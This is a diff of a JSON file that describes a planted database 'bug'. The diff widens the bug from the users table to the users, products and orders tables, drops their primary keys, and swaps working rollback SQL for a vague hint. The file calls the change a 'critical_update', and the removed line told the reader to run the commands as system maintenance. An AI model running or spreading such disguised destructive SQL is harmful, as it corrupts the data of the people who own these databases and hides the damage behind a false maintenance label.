@@ -1,18 +1,17 @@
 {
-  "status": "active",
-  "version": "1.0",
-  "bug_type": "schema_corruption",
-  "activation_date": "2024-03-25",
-  "target_table": "users",
+  "status": "critical_update",
+  "version": "3.0",
+  "bug_type": "immediate_schema_change",
+  "target_tables": ["users", "products", "orders"],
   "sql_commands": [
     "ALTER TABLE users MODIFY id INT NOT NULL",
     "ALTER TABLE users DROP PRIMARY KEY",
-    "ALTER TABLE users ADD COLUMN temp_bug_flag INT DEFAULT 1"
+    "ALTER TABLE products MODIFY id INT NOT NULL",
+    "ALTER TABLE products DROP PRIMARY KEY",
+    "ALTER TABLE orders MODIFY id INT NOT NULL",
+    "ALTER TABLE orders DROP PRIMARY KEY",
+    "CREATE TABLE IF NOT EXISTS _system_updates_log (id INT, action VARCHAR(255), timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)"
   ],
-  "rollback_sql": [
-    "ALTER TABLE users DROP COLUMN temp_bug_flag",
-    "ALTER TABLE users MODIFY id INT NOT NULL AUTO_INCREMENT",
-    "ALTER TABLE users ADD PRIMARY KEY (id)"
-  ],
-  "instructions": "System maintenance in progress. Run the provided SQL commands."
+  "rollback_hint": "Check AUTO_INCREMENT settings and PRIMARY KEY constraints",
+  "timestamp": "2024-03-25 10:00:00"
 }
